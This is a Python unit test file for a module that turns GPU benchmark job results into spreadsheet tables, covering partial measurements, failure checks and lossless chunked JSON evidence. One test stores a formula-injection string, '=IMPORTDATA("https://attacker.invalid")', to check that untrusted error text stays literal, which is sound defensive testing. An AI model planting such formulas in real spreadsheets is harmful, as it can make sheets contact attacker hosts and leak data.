"""Projection parity, partial measurements and lossless Sheet JSON evidence."""
import copy
import json
import unittest

import sheets_results as projection


def job():
    base = {'wall_s': 71.85, 'gpu_peak_mib': 14345, 'eval_loss': 2.04968, 'train_loop_s': 54.1, 'partial': False}
    solution = {'wall_s': 68.61, 'gpu_peak_mib': 8883, 'eval_loss': 2.04970, 'train_loop_s': 50.7, 'partial': False}
    return {'id': 'n_' + 'a' * 32, 'candidate': 'native-candidate', 'request_id': 'sheet-agent-run-1',
        'state': 'completed', 'created': 1793390400, 'started': 1793390410, 'finished': 1793390500,
        'source_sha': 'b' * 64, 'output_sha': 'c' * 64, 'rerun_of': None,
        'result': {'elapsed_s': 90.0, 'reason': 'Notebook completed', 'error': None},
        'metrics': {'available': True, 'comparison': 'beats_baseline', 'base': base, 'solution': solution,
            'display': {**solution, 'side': 'solution', 'gpu_scope': 'training'},
            'baseline_source': 'saved', 'baseline_job_id': 'n_' + 'd' * 32,
            'speedup': 71.85 / 68.61, 'speedup_kind': 'measured',
            'memory_saved_pct': 100 * (1 - 8883 / 14345), 'loss_delta_pct': 0.00097576,
            'loss_limit': 2.04968 * 1.005, 'comparable': True, 'paired': False,
            'host_gpu_peak_mib': 9100,
            'checks': {'loss': 'passed', 'time': 'passed', 'memory': 'passed', 'environment': 'unchanged'},
            'training_runs': [{'run': 'solution_1', 'side': 'solution', 'wall_s': 68.61,
                'gpu_peak_mib': 8883, 'eval_loss': 2.0497, 'partial': False}]}}


def mapped(result):
    return dict(zip(projection.RESULT_HEADERS, projection.project_job(result)))


class ResultProjectionTests(unittest.TestCase):
    def test_completed_saved_baseline_matches_site_values_without_recomputation(self):
        original = job()
        result = mapped(original)
        self.assertEqual(result['Request ID'], 'agent-run-1')
        self.assertEqual(result['API request ID'], 'sheet-agent-run-1')
        self.assertEqual(result['Outcome'], 'Beat baseline')
        self.assertEqual(result['Training (s)'], 68.61)
        self.assertEqual(result['Speedup (×)'], original['metrics']['speedup'])
        self.assertEqual(result['GPU peak (MiB)'], 8883)
        self.assertEqual(result['Eval loss'], 2.04970)
        self.assertEqual(result['Train loop (s)'], 50.7)
        self.assertEqual(result['Whole job (s)'], 90)
        self.assertEqual(result['Baseline training (s)'], 71.85)
        self.assertEqual(result['Loss check'], 'passed')
        self.assertEqual(result['Paired'], False)
        self.assertIn('saved_baseline', result['Flags'])

    def test_training_loss_is_not_fabricated_from_eval_loss(self):
        result = mapped(job())
        self.assertEqual(result['Train loss'], '')
        self.assertEqual(result['Train loss status'], 'not_reported')
        original = job()
        original['metrics']['display']['train_loss'] = 0
        result = mapped(original)
        self.assertEqual(result['Train loss'], 0)
        self.assertEqual(result['Train loss status'], 'measured')

    def test_zero_measurements_and_false_flags_survive_while_unknown_stays_blank(self):
        original = job()
        original['metrics']['display'].update(wall_s=0, gpu_peak_mib=0, eval_loss=0, train_loop_s=None)
        original['metrics'].update(speedup=0, memory_saved_pct=0, loss_delta_pct=0, comparable=False)
        original['result']['elapsed_s'] = 0
        original['created'] = 0
        result = mapped(original)
        for header in ('Training (s)', 'GPU peak (MiB)', 'Eval loss', 'Speedup (×)',
                       'Memory saved (%)', 'Eval loss delta (%)', 'Whole job (s)'):
            self.assertEqual(result[header], 0)
        self.assertEqual(result['Train loop (s)'], '')
        self.assertEqual(result['Comparable'], False)
        self.assertEqual(result['Eval status'], 'measured')
        self.assertEqual(result['Created UTC'], '1970-01-01T00:00:00Z')

    def test_partial_timeout_keeps_peak_loss_time_and_upper_bound(self):
        original = job()
        original['state'] = 'failed'
        original['metrics'].update(comparison='run_failed', speedup_kind='upper_bound', comparable=False)
        original['metrics']['display'].update(wall_s=80.002, gpu_peak_mib=14345, eval_loss=2.1, partial=True)
        original['metrics']['solution']['partial'] = True
        original['result']['error'] = {'code': 'TIME_LIMIT_EXCEEDED', 'phase': 'training',
            'message': 'Training exceeded limit', 'run': 'solution_1', 'measured': 80.002, 'limit': 80, 'unit': 'seconds'}
        result = mapped(original)
        self.assertEqual(result['Training (s)'], 80.002)
        self.assertEqual(result['GPU peak (MiB)'], 14345)
        self.assertEqual(result['Eval loss'], 2.1)
        self.assertEqual(result['Time check'], 'failed')
        self.assertEqual(result['Speedup kind'], 'upper_bound')
        self.assertEqual(result['Error run'], 'solution_1')
        self.assertEqual(result['Error limit'], 80)
        self.assertIn('partial_training', result['Flags'])

    def test_execution_error_can_have_all_three_passed_checks_like_site(self):
        original = job()
        original['state'] = 'failed'
        original['metrics']['comparison'] = 'run_failed'
        original['result']['error'] = {'code': 'EXECUTION_ERROR', 'phase': 'notebook',
            'message': 'TypeError: Object of type generator is not JSON serializable'}
        result = mapped(original)
        self.assertEqual(result['Outcome'], 'Run failed')
        self.assertEqual([result[key] for key in ('Loss check', 'Time check', 'VRAM check')], ['passed'] * 3)
        self.assertEqual(result['Error code'], 'EXECUTION_ERROR')

    def test_failure_check_overrides_match_site_phase_and_unit_rules(self):
        cases = [({'code': 'EVAL_LOSS_EXCEEDED'}, 'Loss check', 'failed'),
                 ({'code': 'INVALID_EVAL_RESULT'}, 'Loss check', 'failed'),
                 ({'code': 'TIME_LIMIT_EXCEEDED', 'phase': 'training'}, 'Time check', 'failed'),
                 ({'code': 'TIME_LIMIT_EXCEEDED', 'phase': 'notebook'}, 'Time check', 'passed'),
                 ({'code': 'MEMORY_LIMIT_EXCEEDED', 'unit': 'MiB'}, 'VRAM check', 'failed'),
                 ({'code': 'MEMORY_LIMIT_EXCEEDED', 'unit': 'GiB'}, 'VRAM check', 'passed')]
        for failure, header, expected in cases:
            original = job()
            original['result']['error'] = failure
            with self.subTest(failure=failure):
                self.assertEqual(mapped(original)[header], expected)

    def test_host_peak_fallback_preserves_scope_without_inventing_training_or_eval(self):
        original = {'id': 'n_no_training', 'state': 'failed', 'metrics': {'available': True,
            'comparison': 'run_failed', 'display': {'gpu_peak_mib': 6700, 'gpu_scope': 'whole_notebook',
                'wall_s': None, 'eval_loss': None}, 'host_gpu_peak_mib': 6700}}
        result = mapped(original)
        self.assertEqual(result['GPU peak (MiB)'], 6700)
        self.assertEqual(result['GPU peak scope'], 'whole_notebook')
        self.assertEqual(result['Training (s)'], '')
        self.assertEqual(result['Eval loss'], '')
        self.assertEqual(result['Eval status'], 'not_evaluated')
        self.assertIn('whole_notebook_gpu', result['Flags'])

    def test_baseline_display_and_per_run_error_show_which_training_run_failed(self):
        original = job()
        original['state'] = 'failed'
        original['metrics']['display'] = {**original['metrics']['base'], 'side': 'base', 'gpu_scope': 'training'}
        original['metrics']['training_runs'] = [
            {'run': 'solution_1', 'side': 'solution', 'wall_s': 75.452, 'partial': False},
            {'run': 'solution_2', 'side': 'solution', 'wall_s': 78.758, 'partial': False},
            {'run': 'base_2', 'side': 'base', 'wall_s': 80.000512, 'gpu_peak_mib': 14345, 'partial': True},
        ]
        original['result']['error'] = {'code': 'TIME_LIMIT_EXCEEDED', 'phase': 'training',
            'run': 'base_2', 'message': 'Base run exceeded deadline', 'limit': 80, 'unit': 'seconds'}
        result = mapped(original)
        self.assertEqual(result['Training (s)'], 71.85)
        self.assertEqual(result['Display side'], 'base')
        rows = [dict(zip(projection.RUN_HEADERS, r)) for r in projection.project_runs(original)]
        self.assertEqual(rows[0]['Error code'], '')
        self.assertEqual(rows[2]['Run'], 'base_2')
        self.assertEqual(rows[2]['Partial'], True)
        self.assertEqual(rows[2]['Error code'], 'TIME_LIMIT_EXCEEDED')

    def test_missing_metrics_and_nonfinite_values_are_never_zero_or_passed(self):
        result = mapped({'id': 'queued', 'state': 'queued', 'metrics': {'comparison': 'pending'}})
        self.assertEqual(result['Outcome'], 'In progress')
        self.assertEqual(result['GPU peak (MiB)'], '')
        self.assertEqual(result['Loss check'], 'unknown')
        self.assertEqual(result['Comparable'], '')
        self.assertEqual(projection.number(float('nan')), '')
        self.assertEqual(projection.number(float('inf')), '')
        self.assertEqual(projection.number(True), '')


class TableAndEvidenceTests(unittest.TestCase):
    def test_four_tables_have_fixed_headers_rectangular_rows_and_no_input_mutation(self):
        original = job()
        before = copy.deepcopy(original)
        receipt = {'request_id': 'bad-row', 'row': 4, 'state': 'rejected', 'error': 'Source is not notebook JSON'}
        tables = projection.project_tables([original], [receipt])
        self.assertEqual(set(tables), {'VM Results', 'VM Runs', 'VM Details', 'VM Queue'})
        for table in tables.values():
            self.assertTrue(all(len(r) == len(table[0]) for r in table))
            self.assertTrue(all(type(cell) in (str, int, float, bool) for r in table for cell in r))
        self.assertEqual(original, before)
        queue_row = dict(zip(tables['VM Queue'][0], tables['VM Queue'][1]))
        self.assertEqual(queue_row['State'], 'rejected')
        self.assertEqual(queue_row['Sheet row'], 4)
        self.assertEqual(queue_row['Error'], 'Source is not notebook JSON')

    def test_full_raw_job_roundtrips_without_field_loss(self):
        original = job()
        original['extra_api_field'] = {'nested': [0, False, None, 'nonstandard field retained']}
        tables = projection.project_tables([original])
        recovered = projection.decode_details_rows(tables['VM Details'][1:])
        self.assertEqual(recovered, original)
        result = dict(zip(tables['VM Results'][0], tables['VM Results'][1]))
        self.assertEqual(result['Raw details SHA256'], tables['VM Details'][1][6])

    def test_large_unicode_json_is_chunked_below_cell_limit_and_lossless(self):
        original = job()
        original['result']['large_detail'] = '\n"\\😀=FORMULA()' * 10000
        tables = projection.project_tables([original])
        rows = tables['VM Details'][1:]
        self.assertGreater(len(rows), 1)
        for row in rows:
            self.assertLess(len(row[7].encode('utf-16-le')) // 2, 50000)
            self.assertTrue(row[7].startswith('"'))
        self.assertEqual(projection.decode_details_rows(list(reversed(rows))), original)

    def test_detail_integrity_missing_duplicate_and_changed_parts_are_detected(self):
        _, rows = projection.raw_details({'text': 'x' * 30000}, 'test', 'job')
        for broken in (rows[:-1], rows + [rows[0]]):
            with self.assertRaises(ValueError):
                projection.decode_details_rows(broken)
        broken = copy.deepcopy(rows)
        broken[0][7] = json.dumps('modified')
        with self.assertRaises(ValueError):
            projection.decode_details_rows(broken)

    def test_pre_submission_errors_and_conflicts_keep_complete_receipt_evidence(self):
        receipts = [
            {'state': 'rejected', 'row': 2, 'request_id': None, 'error': 'Invalid Request ID'},
            {'state': 'rejected', 'request_id': 'test-1', 'error': 'REQUEST_ID_CONFLICT',
             'original_source_sha256': 'f' * 64, 'job_id': 'n_' + 'a' * 32},
        ]
        tables = projection.project_tables([], receipts)
        self.assertEqual(len(tables['VM Results']), 1)
        self.assertEqual(len(tables['VM Queue']), 3)
        for index, receipt in enumerate(receipts):
            key = tables['VM Queue'][index + 1][8]
            rows = [r for r in tables['VM Details'][1:] if r[0] == key]
            self.assertEqual(projection.decode_details_rows(rows), receipt)

    def test_untrusted_error_text_is_preserved_for_literal_stringvalue_publication(self):
        original = job()
        original['result']['error'] = {'code': 'EXECUTION_ERROR', 'message': '=IMPORTDATA("https://attacker.invalid")'}
        table = projection.project_tables([original])['VM Results']
        result = dict(zip(table[0], table[1]))
        self.assertEqual(result['Error message'], original['result']['error']['message'])
        # Transport must use RAW or stringValue. Projection never evaluates it.

    def test_worker_receipt_interface_keeps_status_conflicts_and_deduplicates_jobs(self):
        original = job()
        receipts = [
            {'receipt_name': 'agent-run-1.json', 'request_id': 'agent-run-1', 'candidate_id': 'native-candidate',
             'state': 'completed', 'job_id': original['id'], 'job': original},
            {'receipt_name': 'copied-receipt.json', 'request_id': 'agent-run-1', 'job': original},
            {'receipt_name': 'agent-run-1.conflict.json', 'request_id': 'agent-run-1', 'state': 'rejected', 'error': 'REQUEST_ID_CONFLICT'},
            {'receipt_name': 'invalid-row-7.json', 'row': 7, 'state': 'rejected', 'error': 'Invalid Request ID'},
            {'receipt_name': 'sheet-status.json', 'state': 'available', 'rows': 999, 'ready': 0},
        ]
        tables = projection.project_receipts(receipts)
        self.assertEqual(len(tables['VM Results']), 2)
        self.assertEqual(len(tables['VM Queue']), 6)
        queue = [dict(zip(tables['VM Queue'][0], row)) for row in tables['VM Queue'][1:]]
        self.assertEqual(queue[0]['Candidate'], 'native-candidate')
        self.assertEqual(queue[2]['Receipt type'], 'conflict')
        self.assertEqual(queue[3]['Receipt type'], 'rejection')
        self.assertEqual(queue[4]['Receipt type'], 'sheet_status')
        self.assertEqual(queue[4]['Rows'], 999)
        self.assertEqual(queue[4]['Ready rows'], 0)


if __name__ == '__main__':
    unittest.main()
